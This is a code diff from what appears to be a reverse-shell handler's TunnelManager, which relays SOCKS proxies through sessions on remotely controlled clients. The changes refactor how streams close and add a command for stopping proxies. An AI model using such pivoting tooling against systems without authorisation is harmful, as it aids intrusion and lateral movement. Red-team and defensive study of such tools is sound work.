                 f"({elapsed:.2f}s){self.h.colors['end']}"
             )
             self._log(client_sock, f"SOCKS test OK: {host}:{port} ({elapsed:.2f}s)")
-            self._agent_request(client_sock, {'op': 'close', 'sid': sid}, timeout=5.0)
+            self._channel_request(
+                client_sock, {'op': 'close', 'sid': sid}, timeout=5.0,
+            )
         else:
             err = (resp or {}).get('error', self._last_error or 'no response')
             print(
@@ -1642,8 +2024,8 @@ class TunnelManager:
                         q.get_nowait()
                     except queue.Empty:
                         break
-            if not self._relay_stale(client_sock, reset_gen):
-                self._close_stream_on_agent(client_sock, sid, preferred=tunnel_conn)
+            preferred = tunnel_conn if self._conn_alive(tunnel_conn) else None
+            self._close_stream_on_agent(client_sock, sid, preferred=preferred)
 
     def _relay(self, client_sock, up_conn, down_conn, sid, conn, reset_gen, handle):
         """Full-duplex bulk relay; falls back to single-channel mode when needed."""
@@ -1701,9 +2083,8 @@ class TunnelManager:
                         q.get_nowait()
                     except queue.Empty:
                         break
-            if not self._relay_stale(client_sock, reset_gen):
-                preferred = up_conn if self._conn_alive(up_conn) else down_conn
-                self._close_stream_on_agent(client_sock, sid, preferred=preferred)
+            preferred = up_conn if self._conn_alive(up_conn) else down_conn
+            self._close_stream_on_agent(client_sock, sid, preferred=preferred)
 
     def _conn_alive(self, conn):
         try:
@@ -1877,7 +2258,7 @@ class TunnelManager:
         for p in proxies:
             alive = p['client_sock'] in self.h.revshell_clients
             n = len(self._alive_conns(p['client_sock']))
-            print(f"  {p['id']} #{p['session_id']} 127.0.0.1:{p['listen_port']} [{n}/{TUNNEL_POOL_SIZE} ch, {'up' if alive else 'orphan'}]")
+            print(f"  {p['id']} session#{p['session_id']} 127.0.0.1:{p['listen_port']} [{n}/{TUNNEL_POOL_SIZE} ch, {'up' if alive else 'orphan'}]")
 
     def handle_command(self, client_sock, cmd_parts, from_client=False):
         if not cmd_parts:
@@ -1938,6 +2319,39 @@ class TunnelManager:
                 return True
             print(f"{self.h.colors['red']}Proxy not found{self.h.colors['end']}")
             return True
+        if cmd == 'socks' and len(cmd_parts) >= 3 and cmd_parts[2].lower() == 'stop':
+            try:
+                session_id = int(cmd_parts[1])
+            except ValueError:
+                print(f"{self.h.colors['red']}Invalid session ID{self.h.colors['end']}")
+                return True
+            cs = self.h._get_client_by_id(session_id)
+            if not cs:
+                print(f"{self.h.colors['red']}Client not active{self.h.colors['end']}")
+                return True
+            with self._lock:
+                owned = [p for p in self._proxies.values()
+                        if p.get('client_sock') is cs]
+            if not owned:
+                print(
+                    f"{self.h.colors['yellow']}No SOCKS proxies for "
+                    f"session #{session_id}{self.h.colors['end']}"
+                )
+                return True
+            if len(cmd_parts) >= 4:
+                proxy_id = cmd_parts[3]
+                if not any(p.get('id') == proxy_id for p in owned):
+                    print(
+                        f"{self.h.colors['red']}Proxy {proxy_id} not found "
+                        f"for session #{session_id}{self.h.colors['end']}"
+                    )
+                    return True
+                self._stop_proxy(proxy_id)
+            else:
+                for p in list(owned):
+                    self._stop_proxy(p['id'])
+            return True
+
         if cmd == 'socks' and len(cmd_parts) >= 4 and cmd_parts[2].lower() == 'reset':
             try:
                 session_id = int(cmd_parts[1])
